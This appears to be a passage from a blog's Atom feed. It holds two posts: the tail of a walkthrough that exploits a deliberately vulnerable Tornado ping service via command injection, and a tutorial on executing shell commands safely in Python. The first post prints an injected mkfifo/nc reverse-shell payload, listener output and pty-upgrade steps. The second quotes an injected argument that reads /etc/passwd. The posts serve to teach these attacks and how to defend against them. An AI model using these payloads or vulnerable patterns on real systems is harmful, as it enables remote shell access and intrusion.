        &lt;span class="n"&gt;ping&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;check_output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ping &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;host&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="vm"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;web&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Application&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;
        &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;PingAsAService&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;])&lt;/span&gt;
    &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;listen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;tornado&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ioloop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;IOLoop&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;current&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;start&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using this service is pretty straightforward, passing it the &lt;cite&gt;host&lt;/cite&gt; query
parameter will execute ping and return its output:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% python3 donotrunthis.py &amp;amp;
[1] 11479
% curl &amp;#39;http://localhost:8000/?host=localhost&amp;#39;
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.039 ms

--- localhost ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.039/0.039/0.039/0.000 ms
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;While getting a reverse shell is slightly out of scope for this post, here is
what I usually use. This one is from a well known &lt;a class="reference external" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;cheatsheet&lt;/a&gt; and works for both
BSD and GNU nc.&lt;/p&gt;
&lt;div class="section" id="open-three-terminals"&gt;
&lt;h2&gt;Open three terminals.&lt;/h2&gt;
&lt;p&gt;In one terminal where you don't run a terminal multipler setup your &lt;cite&gt;nc&lt;/cite&gt; to
listen to a port. It is important that you don't run a terminal multiplexer
such as &lt;cite&gt;screen&lt;/cite&gt; or &lt;cite&gt;tmux&lt;/cite&gt; because we will be adjusting the terminal settings
and the mux will interfere.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;% nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This terminal will hang while waiting for a connection. In terminal two we'll
run our exploitable script. Let's not run it in the background as causing tty
input/output on a background job can cause the background process to be
paused.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;amp; python3 donotrunthis.py
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the last terminal we will run our exploit. &lt;cite&gt;curl&lt;/cite&gt; has a handy option of
escaping the URL parameters for you but you need to pass &lt;cite&gt;-G&lt;/cite&gt; to explicitly
make the request a &lt;cite&gt;GET&lt;/cite&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -Gv --data-urlencode &amp;#39;host=localhost;rm /tmp/foo; mkfifo /tmp/foo; cat /tmp/foo | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc localhost 4242 &amp;gt; /tmp/foo &amp;amp;&amp;#39; &amp;#39;http://localhost:8000/&amp;#39;
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8000 (#0)
&amp;gt; GET /?host=localhost%3Brm%20%2Ftmp%2Ffoo%3B%20mkfifo%20%2Ftmp%2Ffoo%3B%20cat%20%2Ftmp%2Ffoo%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%20%7C%20nc%20localhost%204242%20%3E%20%2Ftmp%2Ffoo%20%26 HTTP/1.1
&amp;gt; Host: localhost:8000
&amp;gt; User-Agent: curl/7.58.0
&amp;gt; Accept: */*
&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This terminal will now hang here as our exploitable application never returns
any data. However, if we look over at our terminal with &lt;cite&gt;nc&lt;/cite&gt; in it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our command injection has worked and is now connected to our netcat. But
this shell has a few issues! When we run a program and try to &lt;cite&gt;ctrl+c&lt;/cite&gt; it our
netcat program exits. And trying to run &lt;cite&gt;su&lt;/cite&gt; yields another error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$ su -
su: must be run from a terminal
$
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The reason of why is not relevant in this article but the gist is that your
command injection was not allocated a &lt;cite&gt;pty&lt;/cite&gt;. We can work around that by
first gaining a pty using python.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$ su -
su: must be run from a terminal
$ python -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;
user@hole:~$ whoami
whoami
user
user@hole:~$ su -
su -
Password: asdf

su: Authentication failure
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Our shell gained a pty and with it a fancy prompt but everything we type is
being output and sadly using &lt;cite&gt;ctrl+c&lt;/cite&gt; still exits our nc. Not the process on the
remote.&lt;/p&gt;
&lt;p&gt;To fix this we're going to tell our own terminal to not interpret any command
sequences anymore.&lt;/p&gt;
&lt;p&gt;First we &lt;cite&gt;ctrl+z&lt;/cite&gt; which moves the current &lt;cite&gt;nc&lt;/cite&gt; to the background. We then put
our own terminal in raw mode using &lt;cite&gt;stty raw -echo&lt;/cite&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc -lv 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from localhost 44040 received!
$ su -
su: must be run from a terminal
$ python -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;
user@hole:~$ whoami
whoami
user
user@hole:~$ su -
su -
Password: asdf

su: Authentication failure

user@hole:~$ ^Z
[1]+  Stopped                 nc -lv 4242
$ stty raw -echo
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After you enter this you will see nothing and your own keypresses won't be
shown anymore. Enter &lt;cite&gt;fg&lt;/cite&gt; blindly to resume the netcat process after which
you will see output again as the pty you spawned earlier is now talking to your
terminal. This means the double output for keys is gone. For good measure
&lt;cite&gt;reset&lt;/cite&gt; straight after the &lt;cite&gt;fg&lt;/cite&gt; and let's see if everything is as it should
be.&lt;/p&gt;
&lt;p&gt;This will clear the and possibly resize it for you. You now have a fully
functional reverse shell. You can run tmux or screen, or any other application
your heart desires.&lt;/p&gt;
&lt;/div&gt;
</content><category term="hack"></category><category term="shell"></category><category term="tty"></category></entry><entry><title>Executing commands safely from Python</title><link href="https://supakeen.com/weblog/executing-commands-safely-from-python.html" rel="alternate"></link><published>2018-05-25T12:00:00+02:00</published><updated>2018-05-25T12:00:00+02:00</updated><author><name>supakeen</name></author><id>tag:supakeen.com,2018-05-25:/weblog/executing-commands-safely-from-python.html</id><summary type="html">&lt;p class="first last"&gt;A introduction on how to use Python to execute subcommands safely.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;Python provides multiple ways to execute commands on the system it is running
on. Some of them inherently unsafe, some of them safe in nature but easy to
use in an unsafe way.&lt;/p&gt;
&lt;p&gt;Here I will set out to document the current ways to execute commands with
modules included in Python 3's standard library. Their pros, and their cons.
This article assumes that you are familiar with shells, you don't need to know
everything about them but you do need to know about their basic &lt;a class="reference external" href="https://www.w3resource.com/linux-system-administration/control-operators.php"&gt;syntax&lt;/a&gt;. I also
assume you are using Python 3 and are on Linux while concepts will carry over
to all languages and operating systems.&lt;/p&gt;
&lt;div class="section" id="command-injection"&gt;
&lt;h2&gt;Command Injection&lt;/h2&gt;
&lt;p&gt;To start out you need to understand why executing commands from Python can be
dangerous. This principle applies to all languages and is called
&lt;strong&gt;Command Injection&lt;/strong&gt;, there are  some examples on the &lt;a class="reference external" href="https://www.owasp.org/index.php/Command_Injection"&gt;OWASP&lt;/a&gt; pages and the &lt;a class="reference external" href="https://cwe.mitre.org/data/definitions/77.html"&gt;CWE-77&lt;/a&gt;
page. I will provide my own here.&lt;/p&gt;
&lt;p&gt;Here is some code that will restart a service on your system by the name of
the argument it receives. I name this program &lt;cite&gt;service.py&lt;/cite&gt; and its goal is
to restart services. To do that it uses a function to execute commands called
&lt;a class="reference external" href="https://docs.python.org/3/library/os.html#os.system"&gt;os.system&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;

&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl restart &lt;/span&gt;&lt;span class="si"&gt;{}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If we call our program with &lt;cite&gt;python service.py nginx&lt;/cite&gt; the string that gets put
into our &lt;cite&gt;os.system&lt;/cite&gt;-call will be the string &lt;cite&gt;systemctl restart nginx&lt;/cite&gt; and all
is good in the world. However, if someone calls our program as
&lt;cite&gt;python service.py 'nginx;cat /etc/passwd'&lt;/cite&gt; our executed command will become:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;systemctl&lt;span class="w"&gt; &lt;/span&gt;restart&lt;span class="w"&gt; &lt;/span&gt;nginx&lt;span class="p"&gt;;&lt;/span&gt;
cat&lt;span class="w"&gt; &lt;/span&gt;/etc/passwd
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Where I have added the newline myself for clarity. Our program was not intended to
be reading the &lt;cite&gt;/etc/passwd&lt;/cite&gt; file at all! This is a command injection and it comes
in many shapes and forms and is something you want to prevent.&lt;/p&gt;
&lt;p&gt;Any place where input is passed into a command to be executed one needs to be
especially careful. This can be in scripts such as the example above or websites,
network protocols, and others. Sometimes input can be things you wouldn't
expect to be input and is a reason why I won't call it &lt;em&gt;user input&lt;/em&gt; in this
article. It can be, for example, an HTTP request made by your application that is
changed by a man in the middle attack on an unsafe network, which can put the client
at risk.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="how-does-a-command-get-executed"&gt;
&lt;h2&gt;How does a command get executed?&lt;/h2&gt;
&lt;p&gt;Before I can talk about how to prevent these types of attacks it is important
to dive a tiny bit deeper. How does a command get executed by your operating
system?&lt;/p&gt;
&lt;p&gt;In general your operating system's library will use a set of functions called
&lt;cite&gt;exec*&lt;/cite&gt; functions where the &lt;cite&gt;*&lt;/cite&gt; can be filled with a variety of letters. They
are documented in the &lt;a class="reference external" href="https://linux.die.net/man/3/exec"&gt;man-pages&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;These seem a bit daunting but in general all these functions follow the same
pattern. They all take a &lt;cite&gt;path&lt;/cite&gt; or &lt;cite&gt;file&lt;/cite&gt; to execute, if the function takes a
&lt;cite&gt;file&lt;/cite&gt; the path to the name of that file will be looked up by parsing the
&lt;cite&gt;PATH&lt;/cite&gt; environment variable.&lt;/p&gt;
&lt;p&gt;Some of these functions also allow one to pass the environment to be set for
the executable that will be executed. However they all share a common idiom
which is &lt;strong&gt;executable&lt;/strong&gt; followed by a varying number of arguments.&lt;/p&gt;
&lt;p&gt;This means that whenever we execute a string in the form of
&lt;cite&gt;systemctl restart nginx&lt;/cite&gt; something needs to parse that string into the parts
&lt;cite&gt;systemctl&lt;/cite&gt;, &lt;cite&gt;restart&lt;/cite&gt;, and &lt;cite&gt;nginx&lt;/cite&gt; and give it to one of the functions in the
&lt;cite&gt;exec*&lt;/cite&gt; family. This tends to be done by your shell.&lt;/p&gt;
&lt;p&gt;If we jump back to our previous &lt;cite&gt;os.system&lt;/cite&gt; program it will call the &lt;a class="reference external" href="https://linux.die.net/man/3/system"&gt;system&lt;/a&gt;
function in your standard C library which will in turn execute the command
&lt;cite&gt;sh -c 'systemctl restart nginx'&lt;/cite&gt; to allow the &lt;cite&gt;sh&lt;/cite&gt; executable, which is a
shell, to parse the command into the parts necessary for the &lt;cite&gt;exec*&lt;/cite&gt; function
used.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="shells"&gt;
&lt;h2&gt;Shells&lt;/h2&gt;
&lt;p&gt;As soon as a shell gets involved in parsing your command we are entering a very
dangerous state regarding the characters that are in our command to be executed.
Shells allow executing multiple commands at once, they have built-ins that allow
you to do things without calling commands. Someone can chain everything they want
in there by gaining control of a parameter that gets fed to a shell and shells get
involved in places where you sometimes don't know they will be.&lt;/p&gt;
&lt;p&gt;Can we make arguments passed to shells safe? No, not really. You want to
use a function which does not use a shell at all to prevent shell-based
exploits.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="ways-to-execute-commands-in-python"&gt;
&lt;h2&gt;Ways to execute commands in Python&lt;/h2&gt;
&lt;p&gt;Python 3 offers a variety of ways for executing commands but there is one which
springs out and that is the &lt;a class="reference external" href="https://docs.python.org/3/library/"&gt;subprocess&lt;/a&gt;-module.&lt;/p&gt;
&lt;p&gt;The &lt;a class="reference external" href="https://docs.python.org/3/library/"&gt;subprocess&lt;/a&gt;-module allows us to execute commands without opening a shell to
parse our string into the appropriate parts. This puts us at minimal risk for
being exploited.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Note: Of course the program you are executing through subprocess can still have
its own flaws that allow it to be subverted to do things you don't want.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Let's make a version of our previous program using subprocess. Subprocess offers
many functions but they all follow the same rules for their arguments:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;

&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;restart&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Subprocess's methods take either a list of arguments or a single string. Remember
the previous explanation about the &lt;cite&gt;exec*&lt;/cite&gt; family of functions.&lt;/p&gt;
&lt;p&gt;When you pass a list to subprocess as I've done above then your list will be split,
the first item will be the first argument to the &lt;cite&gt;exec*&lt;/cite&gt; function and the rest of
the arguments will each be passed as a separate argument.&lt;/p&gt;
&lt;p&gt;This means arguments are not interpreted by a shell first and this makes it impossible
for someone to execute other commands through the shell.&lt;/p&gt;
&lt;p&gt;If you pass a single string to subprocess such as:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;subprocess&lt;/span&gt;

&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;systemctl restart nginx&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then that string will be the first argument to the &lt;cite&gt;exec*&lt;/cite&gt; without any splitting,
the arguments will be left empty. If you execute the command above then the &lt;cite&gt;exec*&lt;/cite&gt;
function will look for an executable called &lt;cite&gt;systemctl restart nginx&lt;/cite&gt; on your &lt;cite&gt;PATH&lt;/cite&gt;
which will likely not exist.&lt;/p&gt;
&lt;p&gt;This is a safe way to execute commands in Python even when input is passed as
arguments to your executable.&lt;/p&gt;
&lt;div class="section" id="shell-true"&gt;
&lt;h3&gt;shell=True&lt;/h3&gt;
&lt;p&gt;Subprocess's methods take an additional keyword argument called &lt;cite&gt;shell&lt;/cite&gt; which
can be set to &lt;cite&gt;True&lt;/cite&gt;. If you do so then you can only pass a string which will
be passed the same way, as &lt;cite&gt;sh -c 'command'&lt;/cite&gt;, if you do pass a list then it will
be passed as:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;execve(&amp;quot;/bin/sh&amp;quot;, [&amp;quot;/bin/sh&amp;quot;, &amp;quot;-c&amp;quot;, &amp;quot;systemctl&amp;quot;, &amp;quot;restart&amp;quot;, &amp;quot;nginx&amp;quot;], ...
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="what-if-i-need-a-shell"&gt;
&lt;h2&gt;What if I need a shell?&lt;/h2&gt;
&lt;p&gt;Executing commands in the safe way as described above means that you can't use
those handy shell features you are used to such as &lt;cite&gt;|&lt;/cite&gt;, &lt;cite&gt;&amp;lt;&lt;/cite&gt;, &lt;cite&gt;&amp;gt;&lt;/cite&gt; and their friends.&lt;/p&gt;
&lt;p&gt;Most of these functions can be implemented separately in Python. If you need
a &lt;cite&gt;|&lt;/cite&gt; it is often better to execute the first command, store its output and then
execute the second command giving the output to the new process.&lt;/p&gt;
&lt;p&gt;File redirection (&lt;cite&gt;&amp;gt;&lt;/cite&gt;, and others) can be done in the same way by storing the
output and then writing it to a file in Python.&lt;/p&gt;
&lt;p&gt;For most command line utilities you would normally use with these operators you
can either trivially implement them in Python. You can also try to find a library
on &lt;a class="reference external" href="https://pypi.python.org"&gt;PyPI&lt;/a&gt; to give you the output directly instead of trying to parse &lt;cite&gt;ip&lt;/cite&gt;, &lt;cite&gt;ifconfig&lt;/cite&gt;,
or others in a shell.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="what-if-i-really-really-need-a-shell"&gt;
&lt;h2&gt;What if I really really need a shell?&lt;/h2&gt;
&lt;p&gt;You could use Python's &lt;a class="reference external" href="https://docs.python.org/3/library/shlex.html"&gt;shlex&lt;/a&gt;-module which tries to implement the proper escaping
rules for shells. Specifically you could try to use &lt;cite&gt;shlex.quote&lt;/cite&gt; for each argument
you fill in. Reasoning about what is 'safe' or 'unsafe' becomes very difficult in
this context.&lt;/p&gt;
&lt;/div&gt;
</content><category term="python"></category><category term="python"></category><category term="subprocess"></category></entry></feed>